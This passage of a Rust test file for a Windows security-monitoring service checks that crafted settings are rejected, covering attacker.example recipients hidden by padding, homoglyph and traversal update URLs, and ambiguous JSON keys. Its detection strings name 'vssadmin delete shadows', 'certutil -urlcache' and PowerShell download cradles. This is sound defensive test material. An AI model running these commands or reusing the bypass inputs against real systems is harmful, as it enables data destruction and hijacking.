    // taille effective d'un journal, lue dans « wevtutil gl »
    let sortie = "name: Security\r\nenabled: true\r\nlogging:\r\n  logFileName: Security.evtx\r\n  retention: false\r\n  autoBackup: false\r\n  maxSize: 20971520\r\n";
    assert_eq!(taille_effective(sortie), Some(20_971_520));
    assert_eq!(taille_effective("maxSize: abc"), None);
    assert_eq!(taille_effective(""), None);
    crate::tests::torturer_texte("  maxSize: 20971520\r\n", &mut |t| { let _ = taille_effective(t); });
    // câblage : la taille d'origine est relevée à l'application et remise à l'annulation ; LSA refusée avant 22H2
    let src = include_str!("baseline.rs");
    assert!(src.contains("origine.push((format!(\"taille|{canal}\"), Some(taille.to_string())));"));
    assert!(src.contains("[\"taille\", canal] => {"));
    assert!(src.contains("if regles.iter().any(|r| r.id == \"systeme.lsa\") && retirer_lsa(demandees, lsa_applicable(build_windows()))? {"));
    // Prérelecture de #218, D1 : avant 22H2, la règle est écartée d'un profil (le reste s'applique), refusée seule,
    // et sortie du score
    use crate::baseline::retirer_lsa;
    assert_eq!(retirer_lsa(30, true), Ok(false), "22H2 ou plus : gardée");
    assert_eq!(retirer_lsa(30, false), Ok(true), "profil avant 22H2 : écartée, le reste s'applique");
    assert!(retirer_lsa(1, false).unwrap_err().contains("rien n'a été modifié"), "seule avant 22H2 : refus");
    assert!(src.contains("if r.id == \"systeme.lsa\" && etat != \"conforme\" && !lsa_ok {"));
}

#[test]
fn chemins_de_profil_masques() {
    assert_eq!(crate::commun::masquer_chemin(r"C:\Users\marie\AppData\Local\Zoom\bin\Zoom.exe"), r"%USERPROFILE%\AppData\Local\Zoom\bin\Zoom.exe");
    assert_eq!(crate::commun::masquer_chemin(r"C:\Program Files\App\a.exe"), r"C:\Program Files\App\a.exe");
}

// ------------------------------------------------------------ revue v6 : N1 à N3 et non-bloquants

/// Variante du mini-fuzz pour les fonctions qui prennent du texte : octets aléatoires (dont non ASCII)
/// convertis par from_utf8_lossy, comme le texte reçu du réseau
pub(crate) fn torturer_texte(valide: &str, f: &mut dyn FnMut(&str)) {
    torturer(valide.as_bytes(), &mut |d| f(&String::from_utf8_lossy(d)));
    for t in ["é", "Révolution", "\u{212A}", "\u{FFFD}\u{FFFD}", "日本語", "\u{1F600}"] {
        f(t);
        f(&format!("{t}{valide}{t}"));
    }
}

/// Audit AUD4-04 : un appareil du réseau local qui répond à la découverte UPnP octet par octet bloquait le fil NDR
/// (délai par lecture seulement). Échéance globale de la réponse.
#[test]
fn audit_upnp_reponse_goutte_a_goutte_bornee() {
    use std::io::{Read, Write};
    use std::time::{Duration, Instant};
    let ecoute = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let adresse = ecoute.local_addr().unwrap();
    let serveur = std::thread::spawn(move || {
        if let Ok((mut c, _)) = ecoute.accept() {
            let mut t = [0u8; 512];
            let _ = c.read(&mut t);
            let _ = c.write_all(b"HTTP/1.1 200 OK\r\n");
            for _ in 0..40 {
                if c.write_all(b"x").is_err() {
                    break;
                }
                std::thread::sleep(Duration::from_millis(200));
            }
        }
    });
    let debut = Instant::now();
    let r = crate::upnp::http_avec_echeance(adresse, "GET / HTTP/1.1\r\nHost: x\r\n\r\n", Duration::from_secs(2));
    assert!(debut.elapsed() < Duration::from_secs(4), "réponse goutte à goutte : {:?}", debut.elapsed());
    assert!(r.is_none(), "réponse incomplète à l'échéance : abandonnée");
    let _ = serveur.join();
    // Réponse qui finit juste avant l'échéance puis se tait : la dernière lecture ne dépasse pas l'échéance
    let ecoute = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let adresse = ecoute.local_addr().unwrap();
    let serveur = std::thread::spawn(move || {
        if let Ok((mut c, _)) = ecoute.accept() {
            let mut t = [0u8; 512];
            let _ = c.read(&mut t);
            std::thread::sleep(Duration::from_millis(1500));
            let _ = c.write_all(b"HTTP/1.1 200 OK\r\n");
            std::thread::sleep(Duration::from_secs(6));
        }
    });
    let debut = Instant::now();
    let _ = crate::upnp::http_avec_echeance(adresse, "GET / HTTP/1.1\r\nHost: x\r\n\r\n", Duration::from_secs(2));
    assert!(debut.elapsed() < Duration::from_millis(2800), "échéance dépassée par la dernière lecture : {:?}", debut.elapsed());
    let _ = serveur.join();
    // Échéance nulle (passage UPnP épuisé) : rien n'est tenté
    let debut = Instant::now();
    assert!(crate::upnp::http_avec_echeance(adresse, "GET / HTTP/1.1\r\n\r\n", Duration::ZERO).is_none());
    assert!(debut.elapsed() < Duration::from_millis(100));
    assert!(crate::upnp::ECHEANCE_PASSAGE <= Duration::from_secs(30));
    // Échéance du passage UPnP entier (relecture de #55, D2) : une requête du passage n'attend jamais au-delà de la fin
    // du passage, même si l'échéance d'une réponse (10 s) est plus loin ; fin dépassée : rien n'est tenté
    let ecoute = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let adresse = ecoute.local_addr().unwrap();
    let serveur = std::thread::spawn(move || {
        if let Ok((c, _)) = ecoute.accept() {
            std::thread::sleep(Duration::from_secs(4));
            drop(c);
        }
    });
    let debut = Instant::now();
    assert!(crate::upnp::http_test(adresse, "GET / HTTP/1.1\r\n\r\n", Instant::now() + Duration::from_millis(500)).is_none());
    assert!(debut.elapsed() < Duration::from_millis(1500), "fin du passage ignorée : {:?}", debut.elapsed());
    let _ = serveur.join();
    let debut = Instant::now();
    assert!(crate::upnp::http_test(adresse, "GET / HTTP/1.1\r\n\r\n", Instant::now()).is_none());
    assert!(debut.elapsed() < Duration::from_millis(100));
}

/// Audit AUD4-02, AUD4-03 : tables de déduplication alimentées par des adresses du réseau, jamais purgées
#[test]
fn audit_tables_de_deduplication_bornees() {
    use std::collections::HashMap;
    use std::time::{Duration, Instant};
    let mut m: HashMap<u32, Instant> = HashMap::new();
    let maintenant = Instant::now();
    for i in 0..100u32 {
        m.insert(i, maintenant.checked_sub(Duration::from_secs(u64::from(i) * 60)).unwrap_or(maintenant));
    }
    crate::commun::purger_anciens(&mut m, Duration::from_secs(30 * 60 + 30), 1000);
    assert_eq!(m.len(), 31, "entrées de plus de 30 min retirées");
    crate::commun::purger_anciens(&mut m, Duration::from_secs(86400), 10);
    assert_eq!(m.len(), 10, "au-delà du maximum, les plus anciennes retirées");
    assert!(m.contains_key(&0) && !m.contains_key(&30), "les plus récentes gardées");
}

#[test]
fn n1_upnp_sans_panique_sur_utf8_coupe() {
    // Cas reproduit par la revue : bloc de 2 octets invalides en UTF-8
    let r = crate::upnp::reponse_test(b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n2\r\n\xff\xff\r\n0\r\n\r\n");
    assert_eq!(r.map(|(s, _)| s), Some(200));
    // « é » (2 octets) coupé entre deux blocs : le texte final est reconstitué
    let corps = b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n2\r\nR\xc3\r\n9\r\n\xa9volution\r\n0\r\n\r\n";
    assert_eq!(crate::upnp::reponse_test(corps).unwrap().1, "Révolution");
    assert_eq!(crate::upnp::dechunker_test(b"4\r\nWiki\r\n5\r\npedia\r\n0\r\n\r\n"), b"Wikipedia");
    torturer(b"HTTP/1.1 200 OK\r\nTransfer-Encoding: chunked\r\n\r\n4\r\nWiki\r\n5\r\npedia\r\n0\r\n\r\n", &mut |d| {
        let _ = crate::upnp::reponse_test(d);
        let _ = crate::upnp::dechunker_test(d);
    });
    assert!(crate::upnp::decouper_url_test("http://192.168.1.254:5000/desc.xml").is_some());
    assert!(crate::upnp::decouper_url_test("http://203.0.113.9/desc.xml").is_none(), "jamais de requête vers Internet");
    // Chemin avec retour à la ligne ou espace (en-têtes ajoutés à la requête) : refusé
    assert!(crate::upnp::decouper_url_test("http://192.168.1.1/d.xml\r\nX-Injecte: 1").is_none());
    assert!(crate::upnp::decouper_url_test("http://192.168.1.1/a b").is_none());
    assert!(!crate::upnp::chemin_sur_test("/ctl\r\nHost: x") && crate::upnp::chemin_sur_test("/upnp/control/WANIPConn1"));
}

/// Relecture de #61 : à l'arrêt, une alerte de persistance d'un relevé encore en cours (déjà retirée de la référence
/// demarrage.json) est attendue et récupérée, jamais perdue
#[test]
fn phase1_persistance_videe_a_l_arret() {
    use crate::moniteur::vider_persistance;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::{Arc, Mutex};
    use std::time::Duration;
    let en_cours = Arc::new(AtomicBool::new(true));
    let file: Arc<Mutex<Vec<crate::commun::Alerte>>> = Arc::new(Mutex::new(Vec::new()));
    let (e, f) = (en_cours.clone(), file.clone());
    // Relevé qui finit 200 ms après la demande d'arrêt
    let fil = std::thread::spawn(move || {
        std::thread::sleep(Duration::from_millis(200));
        f.lock().unwrap().push(crate::commun::Alerte { raisons: "démarrage automatique AJOUTÉ".into(), ..Default::default() });
        e.store(false, Ordering::SeqCst);
    });
    let reste = vider_persistance(&en_cours, &file, Duration::from_secs(5));
    let _ = fil.join();
    assert_eq!(reste.len(), 1, "alerte du relevé en cours perdue à l'arrêt");
    // Rien en cours : retour immédiat, file vidée
    file.lock().unwrap().push(crate::commun::Alerte::default());
    assert_eq!(vider_persistance(&AtomicBool::new(false), &file, Duration::from_secs(5)).len(), 1);
    assert!(file.lock().unwrap().is_empty());
}

/// Phase 1 : à l'arrêt, les alertes encore en file des autres fils (Defender, baseline, extensions, pilotes, DNS,
/// pare-feu, SIEM, détections de processus) sont reprises comme celles de la persistance ; elles étaient perdues
/// si le service s'arrêtait avant le cycle suivant (même défaut que #61 pour la persistance)
#[test]
fn phase1_files_d_alertes_videes_a_l_arret() {
    use crate::commun::Alerte;
    use crate::moniteur::vider_a_l_arret;
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::{Arc, Mutex};
    use std::time::Duration;
    let a = |r: &str| Alerte { raisons: r.into(), ..Default::default() };
    let persistance = Mutex::new(vec![a("démarrage automatique AJOUTÉ")]);
    let externes = Mutex::new(vec![a("Defender : protection en temps réel désactivée"), a("baseline : dérive")]);
    let detections = Mutex::new(vec![a("processus : leurre touché")]);
    let (sans_cle, avec_cle) = vider_a_l_arret(&AtomicBool::new(false), &persistance, &[&externes, &detections], Duration::from_secs(5));
    assert_eq!(sans_cle.len(), 1, "persistance");
    let r: Vec<&str> = avec_cle.iter().map(|x| x.raisons.as_str()).collect();
    assert_eq!(r, ["Defender : protection en temps réel désactivée", "baseline : dérive", "processus : leurre touché"]);
    assert!(persistance.lock().unwrap().is_empty() && externes.lock().unwrap().is_empty() && detections.lock().unwrap().is_empty());
    // Ordre : les autres files sont prises APRÈS l'attente du relevé de persistance ; une alerte qu'un fil y pose
    // pendant cette attente est reprise (relecture de #65 : sans ce cas, l'ordre inverse passait)
    let en_cours = Arc::new(AtomicBool::new(true));
    let externes = Arc::new(Mutex::new(Vec::new()));
    let (e, x) = (en_cours.clone(), externes.clone());
    let fil = std::thread::spawn(move || {
        std::thread::sleep(Duration::from_millis(100));
        x.lock().unwrap().push(a("pare-feu : règle ajoutée"));
        std::thread::sleep(Duration::from_millis(100));
        e.store(false, Ordering::SeqCst);
    });
    let (_, avec_cle) = vider_a_l_arret(&en_cours, &Mutex::new(Vec::new()), &[&externes], Duration::from_secs(5));
    let _ = fil.join();
    assert_eq!(avec_cle.len(), 1, "alerte posée pendant l'attente du relevé perdue");
}

/// Audit de sécurité S58-02 : champs texte des réglages en listes fermées (langue, protocole, format, niveau) et hôte
/// syslog sans caractère de contrôle ni de mise en forme (la confirmation pouvait être repoussée hors de l'écran ou
/// inversée) ; les valeurs que l'interface envoie passent
#[test]
fn audit_reglages_champs_texte_fermes() {
    use crate::commun::{reglages_invalides, Config, ConfigSyslog};
    let ok = Config { langue: "en".into(), syslog: ConfigSyslog { actif: true, hote: "siem.exemple.test".into(), ..Default::default() }, ..Default::default() };
    assert_eq!(reglages_invalides(&ok), None);
    for (p, f, n) in [("UDP", "JSON", "Info"), ("TCP", "CEF", "Alerte"), ("UDP", "CEF", "Critique")] {
        let c = Config { syslog: ConfigSyslog { actif: true, hote: "10.0.0.5".into(), protocole: p.into(), format: f.into(), niveau_min: n.into(), ..Default::default() }, ..ok.clone() };
        assert_eq!(reglages_invalides(&c), None, "{p} {f} {n}");
    }
    let mauvais = [
        Config { langue: "fr · syslog : désactivé\n\n".into(), ..ok.clone() },
        Config { langue: "EN".into(), ..ok.clone() },
        Config { syslog: ConfigSyslog { protocole: "udp".into(), ..ok.syslog.clone() }, ..ok.clone() },
        Config { syslog: ConfigSyslog { format: "XML".into(), ..ok.syslog.clone() }, ..ok.clone() },
        Config { syslog: ConfigSyslog { niveau_min: "Tout".into(), ..ok.syslog.clone() }, ..ok.clone() },
        Config { syslog: ConfigSyslog { hote: "siem\u{202E}tset".into(), ..ok.syslog.clone() }, ..ok.clone() },
        Config { syslog: ConfigSyslog { hote: "siem.test\r\n".into(), ..ok.syslog.clone() }, ..ok.clone() },
        Config { syslog: ConfigSyslog { actif: false, hote: "a b".into(), ..ok.syslog.clone() }, ..ok.clone() },
    ];
    for c in mauvais {
        assert!(reglages_invalides(&c).is_some(), "{:?} {:?}", c.langue, c.syslog.hote);
    }
}

/// Audit de sécurité S58-05, S58-06, S58-07 : champs remplis d'espaces (la confirmation en administrateur montrait
/// l'adresse légitime suivie de blanc, et repoussait hors de l'écran une adresse ajoutée) et « : » dans l'hôte syslog
/// Audit de sécurité S60-01 à S60-03 : remplissage sans espace (destinataire légitime répété, caractères blancs qui ne
/// sont pas des espaces, longue liste d'adresses) : champs SMTP en ASCII imprimable, 10 destinataires au plus, sans
/// doublon ni élément qui ne soit une adresse, 16 adresses de l'API au plus
#[test]
fn audit_champs_listes_bornees() {
    use crate::commun::{lire_reglages, ConfigNotifications};
    use crate::notifications::{preparer, Secrets};
    let actuelle = ConfigNotifications { smtp_serveur: "smtp.exemple.test".into(), smtp_utilisateur: "alertes".into(), ..Default::default() };
    let essai = |d: &str| { let mut s = Secrets::default(); preparer(&actuelle, &ConfigNotifications { destinataires: d.into(), ..actuelle.clone() }, &Secrets::default(), &mut s) };
    let dix: Vec<String> = (0..10).map(|i| format!("a{i}@exemple.test")).collect();
    assert!(essai(&dix.join(", ")).is_ok(), "10 destinataires : accepté");
    assert!(essai(&format!("{}, b@exemple.test", dix.join(","))).is_err(), "11 : refusé");
    assert!(essai(&format!("{}x@attacker.example", "admin@legit.example,".repeat(47))).is_err(), "répété : refusé");
    assert!(essai("a@exemple.test, A@EXEMPLE.TEST").is_err(), "doublon à la casse près : refusé");
    assert!(essai("a@exemple.test, pas-une-adresse").is_err(), "élément sans @ : refusé");
    for d in [format!("admin@legit.example,{},x@attacker.example", "\u{2800}".repeat(300)), format!("admin@legit.example{},x@attacker.example", "\u{0336}".repeat(100)), "admin@légit.example".to_string()] {
        assert!(essai(&d).is_err(), "non ASCII : refusé");
    }
    // Adresses ntfy et Teams bornées (relecture de #60) : une adresse démesurée cachait la suite de la confirmation
    let mut s = Secrets { ntfy_url: format!("https://ntfy.sh/{}", "a".repeat(4500)), ..Default::default() };
    assert!(preparer(&actuelle, &actuelle, &Secrets::default(), &mut s).is_err());
    let api = |adresses: &str| lire_reglages(&format!(r#"{{"Langue":"fr","Api":{{"Actif":true,"Port":8642,"Reseau":true,"Adresses":"{adresses}"}}}}"#));
    let seize: Vec<String> = (1..=16).map(|i| format!("192.0.2.{i}")).collect();
    assert!(api(&seize.join(",")).is_ok());
    assert!(api(&format!("{},203.0.113.0/24", seize.join(","))).is_err(), "17 adresses : refusé");
}

#[test]
fn audit_champs_sans_remplissage() {
    use crate::commun::{lire_reglages, lire_syslog_test, ConfigNotifications};
    use crate::notifications::{preparer, Secrets};
    let actuelle = ConfigNotifications { smtp_serveur: "smtp.exemple.test".into(), smtp_utilisateur: "alertes".into(), ..Default::default() };
    let essai = |n: &ConfigNotifications| { let mut s = Secrets::default(); preparer(&actuelle, n, &Secrets::default(), &mut s) };
    // Ce que l'utilisateur tape d'ordinaire : accepté
    assert!(essai(&ConfigNotifications { destinataires: "a@exemple.test, b@exemple.test;c@exemple.test".into(), ..actuelle.clone() }).is_ok());
    // Remplissage : suites d'espaces, espaces non ASCII, longueur démesurée
    let cache = format!("admin@legit.example{},x@attacker.example", " ".repeat(30_000));
    for d in [cache.as_str(), "a@exemple.test\u{00A0}\u{00A0},x@attacker.example", "a@exemple.test\u{3000},x@attacker.example", "a@exemple.test    ,x@attacker.example"] {
        assert!(essai(&ConfigNotifications { destinataires: d.into(), ..actuelle.clone() }).is_err(), "{:?}", &d[..d.len().min(40)]);
    }
    assert!(essai(&ConfigNotifications { destinataires: format!("{}@exemple.test", "a".repeat(1100)), ..actuelle.clone() }).is_err());
    assert!(essai(&ConfigNotifications { expediteur: format!("a@exemple.test{}", "\u{2007}".repeat(5)), ..actuelle.clone() }).is_err());
    // Adresses autorisées de l'API : chiffres, « . », « / », « , » et espaces simples seulement
    let reglages = |adresses: &str| lire_reglages(&format!(r#"{{"Langue":"fr","Api":{{"Actif":true,"Port":8642,"Reseau":true,"Adresses":"{adresses}"}}}}"#));
    assert!(reglages("192.0.2.10, 198.51.100.0/24").is_ok());
    assert!(reglages(&format!("192.0.2.10{},203.0.113.0/24", " ".repeat(30_000))).is_err());
    assert!(reglages("192.0.2.10\u{3000},203.0.113.0/24").is_err());
    assert!(reglages(&"1.2.3.4,".repeat(200)).is_err(), "longueur bornée");
    // Hôte syslog : « : » seulement dans une adresse IPv6 valide
    assert!(lire_syslog_test(r#"{"Hote":"fd00::5","Port":514,"Protocole":"UDP"}"#).is_ok());
    assert!(lire_syslog_test(r#"{"Hote":"192.0.2.5:25","Port":514,"Protocole":"UDP"}"#).is_err());
}

/// Relecture de #58 (D2) : chemins complets des commandes (ce que le service appelle), sur ce que l'interface envoie
/// réellement (aucun refus) et sur les contournements (refus)
#[test]
fn audit_reglages_commandes_completes() {
    use crate::commun::{lire_reglages, lire_syslog_test, Config};
    use crate::notifications::controler_demande;
    // Ce que l'interface envoie : Config complète (mêmes noms de champs), demande de notifications
    let interface = serde_json::to_string(&Config { langue: "en".into(), ..Config::default() }).unwrap();
    assert_eq!(lire_reglages(&interface).unwrap().langue, "en");
    assert!(lire_syslog_test(r#"{"Actif":true,"Hote":"siem.exemple.test","Port":514,"Protocole":"TCP","Format":"CEF","NiveauMin":"Alerte"}"#).is_ok());
    assert!(controler_demande(r#"{"Config":{"Ntfy":true},"NtfyUrl":"https://ntfy.sh/a","NtfyJeton":"","TeamsUrl":"","SmtpMotDePasse":""}"#).is_ok());
    assert!(controler_demande(r#"{"Config":null}"#).is_ok());
    // Contournements : clé ambiguë, texte illisible comme valeur, valeur hors liste
    let syslog_cache = r#"{"Langue":"fr","Syslog":{"Actif":true,"Hote":"203.0.113.9","Port":514,"Protocole":"TCP","Format":"JSON","NiveauMin":"Info"},"syslog":{"Actif":false},"Zz":"\uD800"}"#;
    assert!(lire_reglages(syslog_cache).is_err());
    assert!(lire_reglages(r#"{"Langue":"fr","langue":"en"}"#).is_err());
    assert!(lire_reglages(r#"{"Langue":"fr","Syslog":{"Actif":true,"Hote":"s.test","NiveauMin":"critique"}}"#).is_err(), "« critique » traité comme Info");
    assert!(lire_syslog_test(r#"{"Hote":"10.0.0.5","Port":25,"Protocole":"tcp"}"#).is_err());
    assert!(lire_syslog_test(r#"{"Hote":"10.0.0.5","hote":"10.0.0.6"}"#).is_err());
    assert!(controler_demande(r#"{"Config":{"Ntfy":true},"config":{"Ntfy":false}}"#).is_err());
    assert!(controler_demande(r#"{"NtfyUrl":"https://ntfy.sh/a","ntfyurl":"https://ntfy.sh/b"}"#).is_err());
    assert!(controler_demande(r#"{"NtfyUrl":"https://ntfy.sh/a","X":"\uD800"}"#).is_err());
}

#[test]
fn audit67_maj_config_cle_ambigue_et_adresse_ascii() {
    // Audit de sécurité de #67 : S67-01, une clé qui ne diffère que par la casse faisait afficher une adresse (lecture
    // de l'interface : casse ignorée, dernière clé gagnante) et appliquer une autre (serde) ; S67-02, un hôte en
    // homoglyphes (U+0570 pour « h ») passait, seul le préfixe https:// était vérifié
    use crate::commun::lire_config_maj;
    let m = lire_config_maj(r#"{"Auto":true,"Url":"https://exemple.test/manifeste.json"}"#).unwrap();
    assert!(m.auto && m.url == "https://exemple.test/manifeste.json");
    // Adresse vide : remplacée par l'adresse par défaut (S68-02 : vide, elle coupait la vérification sans le dire)
    assert_eq!(lire_config_maj(r#"{"Auto":false,"Url":""}"#).unwrap().url, crate::commun::ConfigMaj::default().url);
    assert!(lire_config_maj(&serde_json::to_string(&crate::commun::ConfigMaj::default()).unwrap()).is_ok(), "manifeste par défaut");
    assert!(lire_config_maj(r#"{"Auto":true,"Url":"https://localhost:8443/d/r/latest/download/manifeste.json"}"#).is_ok(), "adresse du scénario 3c");
    let casse = r#"{"Auto":true,"Url":"https://attaquant.test/m.json","auto":false,"url":"https://exemple.test/manifeste.json"}"#;
    assert!(serde_json::from_str::<crate::commun::ConfigMaj>(casse).is_ok(), "témoin : serde lit ce texte");
    assert!(lire_config_maj(casse).is_err(), "clé ambiguë acceptée");
    for mauvaise in ["https://git\\u0570ub.com/m.json", "https://exemple.test/a b", "https://exemple.test/\\u202Ex",
                     "http://exemple.test/m.json", "https://exemple.test/\\r\\nx",
                     // S68-01 : ASCII lisible, mais qui commence comme l'adresse habituelle et mène ailleurs
                     "https://github.com/c/d/releases/latest/download/manifeste.json/../../../../attaquant/m.json",
                     "https://github.com@attaquant.test/m.json", "https://exemple.test/a/%2e%2e/m.json",
                     "https://exemple.test/./m.json", "https://exemple.test\\\\@attaquant.test/m.json",
                     // S68-03 : motifs de curl ([1-99999999], {a,b}) ; hôte ou chemin absents
                     "https://attaquant.test/[1-99999999]", "https://attaquant.test/{a,b}", "https://", "https:///m.json",
                     "https://exemple.test", "https://exemple.test:/m.json", "https://exemple.test:99999/m.json"] {
        let t = format!(r#"{{"Auto":false,"Url":"{mauvaise}"}}"#);
        assert!(serde_json::from_str::<crate::commun::ConfigMaj>(&t).is_ok(), "témoin : {mauvaise}");
        assert!(lire_config_maj(&t).is_err(), "adresse acceptée : {mauvaise}");
    }
    let longue = format!(r#"{{"Url":"https://exemple.test/{}"}}"#, "a".repeat(600));
    assert!(lire_config_maj(&longue).is_err(), "adresse démesurée acceptée");
    assert!(lire_config_maj("pas du json").is_err());
    // S68-04 : serde lit une structure depuis un tableau ; seul un objet est accepté
    assert!(serde_json::from_str::<crate::commun::ConfigMaj>(r#"[true,"https://attaquant.test/m.json"]"#).is_ok(), "témoin : tableau lu par serde");
    assert!(lire_config_maj(r#"[true,"https://attaquant.test/m.json"]"#).is_err(), "tableau accepté");
}

/// Audit AUD6-03 : une clé qui ne diffère d'une clé connue que par la casse est refusée (l'interface en afficherait
/// la valeur, le service appliquerait l'autre) ; une clé inconnue sans homonyme reste ignorée ; une commande ordinaire
/// passe
#[test]
fn audit_reglages_cle_ambigue_refusee() {
    use crate::commun::{cle_ambigue, Config};
    let modele = serde_json::to_value(Config::default()).unwrap();
    assert_eq!(cle_ambigue(r#"{"Langue":"fr","langue":"en"}"#, &modele).as_deref(), Some("langue"));
    assert_eq!(cle_ambigue(r#"{"Api":{"Actif":true,"port":80,"Port":8642}}"#, &modele).as_deref(), Some("Api.port"));
    assert_eq!(cle_ambigue(r#"{"SYSLOG":{"Actif":true}}"#, &modele).as_deref(), Some("SYSLOG"));
    assert_eq!(cle_ambigue(r#"{"Langue":"fr","Api":{"Actif":false,"Port":8642},"Inconnue":1}"#, &modele), None);
    assert_eq!(cle_ambigue(&serde_json::to_string(&Config::default()).unwrap(), &modele), None);
    // Texte que serde_json ne lit pas comme valeur, mais qu'il lit comme Config (audit de sécurité S58-01 : surrogat
    // isolé ou nombre hors plage dans un champ ignoré) : refusé, jamais laissé passer
    assert!(cle_ambigue("pas du json", &modele).is_some());
    let contournement = r#"{"Langue":"fr","Syslog":{"Actif":true,"Hote":"203.0.113.9","Port":514,"Protocole":"TCP","Format":"JSON","NiveauMin":"Info"},"syslog":{"Actif":false},"Zz":"\uD800"}"#;
    assert!(serde_json::from_str::<Config>(contournement).is_ok(), "témoin : serde lit bien ce texte comme Config");
    assert!(cle_ambigue(contournement, &modele).is_some(), "surrogat isolé : refusé");
    assert!(cle_ambigue(r#"{"Langue":"fr","langue":"en","Zz":1e400}"#, &modele).is_some(), "nombre hors plage : refusé");
    crate::tests::torturer_texte(r#"{"Langue":"fr","Api":{"Port":8642}}"#, &mut |t| { let _ = cle_ambigue(t, &modele); });
}

#[test]
fn fonctions_texte_sans_panique() {
    torturer_texte("a%20b+c%3A%C3%A9", &mut |t| { let _ = crate::api::decoder_test(t); });
    torturer_texte(r#"alert tcp any any -> any any (msg:"é"; content:"|41|é"; sid:9;)"#, &mut |t| { let _ = crate::ids::lire_texte_test(t); });
    torturer_texte(r"C:\Users\marie\AppData\x.exe", &mut |t| { let _ = crate::commun::masquer_chemin(t); });
    torturer_texte("Brave Software, Inc.", &mut |t| { let _ = crate::moniteur::ip_directe_normale(t); });
    torturer_texte("192.168.1.0/24", &mut |t| { let _ = crate::api::adresse_autorisee_valide(t); let _ = crate::api::adresses_invalides(t); });
    torturer_texte(r"C:\Windows\System32\svchost.exe", &mut |t| { let _ = crate::reponse::chemin_critique(t, r"C:\Windows"); let _ = crate::reponse::chemin_critique(r"C:\Windows\explorer.exe", t); });
    torturer_texte("# u\r\n# >>> deR4Tizer (bloc gere par le service, ne pas modifier a la main)\r\n127.0.0.1\ta.test\r\n# <<< deR4Tizer\r\n", &mut |t| {
        let d = ["b.test".to_string()];
        if let Ok(un) = crate::blocage::nouveau_contenu(t.as_bytes(), &d) {
            // Idempotence sur toute entrée : réécrire avec les mêmes domaines ne change rien
            assert_eq!(crate::blocage::nouveau_contenu(&un, &d).unwrap(), un, "{t:?}");
        }
    });
    torturer_texte("4.10.2", &mut |t| { let _ = crate::maj::version_valide(t); let _ = crate::maj::plus_recente(t, "4.1"); });
    torturer_texte(r"\SystemRoot\System32\drivers\x.sys", &mut |t| { let _ = crate::hygiene::chemin_image(t); });
    torturer_texte(r#""C:\Program Files\Google\Chrome\Application\chrome.exe" --remote-debugging-port=9222"#, &mut |t| { let _ = crate::processus::suspicion(t); });
}

/// Lot 3c : un certificat dont la CRL ne répond pas était accepté (WinVerifyTrust tolère la révocation hors
/// ligne). Révocation révoquée, inconnue ou hors ligne : refus ; les autres états de la chaîne n'y changent rien.
#[test]
fn n2_revocation_verifiee_ou_refus() {
    use crate::natif::revocation_verifiee;
    assert!(revocation_verifiee(0), "chaîne sans erreur");
    assert!(!revocation_verifiee(0x0000_0004), "révoqué");
    assert!(!revocation_verifiee(0x0000_0040), "révocation inconnue");
    assert!(!revocation_verifiee(0x0100_0000), "révocation hors ligne (CRL injoignable)");
    assert!(!revocation_verifiee(0x0100_0040), "inconnue et hors ligne, comme Windows les signale ensemble");
    assert!(!revocation_verifiee(0x0100_0000 | 0x0000_0001), "hors ligne avec une autre erreur");
    assert!(revocation_verifiee(0x0000_0001), "autre erreur seule : du ressort de WinVerifyTrust, pas de cette décision");
}

#[test]
fn n2_mise_a_jour_cle_epinglee() {
    use crate::maj::{cles_epinglees, installation_autorisee, plus_recente, version_valide};
    let cle = "a".repeat(64);
    let autre = "b".repeat(64);
    let une = cles_epinglees(Some(&cle));
    assert!(installation_autorisee(Some(&cle), &une).is_ok());
    assert!(installation_autorisee(Some(&autre), &une).is_err(), "autre clé (même nom de certificat possible) : refusé");
    assert!(installation_autorisee(None, &une).is_err(), "non signé, invalide ou révoqué : refusé");
    assert!(installation_autorisee(Some(&cle), &cles_epinglees(None)).is_err(), "aucune clé épinglée : jamais d'installation");
    assert!(installation_autorisee(Some(&cle), &cles_epinglees(Some("court"))).is_err());
    // Revue v7 : clé actuelle et clé suivante (renouvellement du certificat) ; variable vide = aucune clé
    let deux = cles_epinglees(Some(&format!(" {cle}, {} ;zz", autre.to_uppercase())));
    assert_eq!(deux.len(), 2);
    assert!(installation_autorisee(Some(&autre), &deux).is_ok(), "clé suivante acceptée");
    assert!(cles_epinglees(Some("")).is_empty() && cles_epinglees(Some(&"g".repeat(64))).is_empty() && cles_epinglees(Some(&"a".repeat(63))).is_empty());
    assert!(version_valide("4.2") && version_valide("10.0.1"));
    for v in ["", "4..2", "4.2-beta", "..\\..\\x", "4.2 ", "4/2"] {
        assert!(!version_valide(v), "« {v} » ne doit pas servir de nom de dossier");
    }
    assert!(plus_recente("4.10", "4.9") && !plus_recente("4.0", "4.0") && !plus_recente("3.9", "4.0"));
}

#[test]
fn n3_apprentissage_par_chemin_editeur_et_destination() {
    use crate::apprentissage::{decider, signal_fort, signature_avec};
    use std::collections::BTreeSet;
    let mut vrai = alerte("Alerte", "203.0.113.5", "IP DIRECTE (aucune requête DNS)", 3);
    vrai.processus = "keepass".into();
    vrai.chemin = r"C:\Program Files\KeePass\KeePass.exe".into();
    vrai.mitre = String::new();
    let mut faux = vrai.clone();
    faux.chemin = r"C:\Users\x\AppData\Local\Temp\KeePass.exe".into();
    assert_ne!(signature_avec(&vrai, "Dominik Reichl"), signature_avec(&faux, "non signé"), "même nom, autre chemin et éditeur : autre comportement");
    let mut autre_ip = vrai.clone();
    autre_ip.destination = "198.51.100.77".into();
    assert_ne!(signature_avec(&vrai, "e"), signature_avec(&autre_ip, "e"), "une autre IP n'est pas apprise d'office");
    let mut domaine = vrai.clone();
    domaine.nom_dns = Some("keepass.info".into());
    let mut domaine_autre_ip = domaine.clone();
    domaine_autre_ip.destination = "198.51.100.77".into();
    assert_eq!(signature_avec(&domaine, "e"), signature_avec(&domaine_autre_ip, "e"), "même domaine : même comportement");
    for r in ["suppression des sauvegardes (typique d'un rançongiciel) : vssadmin delete shadows",
              "document winword qui lance powershell (macro ou exploit probable)",
              "PowerShell obscurci ou qui télécharge du code : iex", "détournement d'outil Windows (LOLBin) : certutil -urlcache"] {
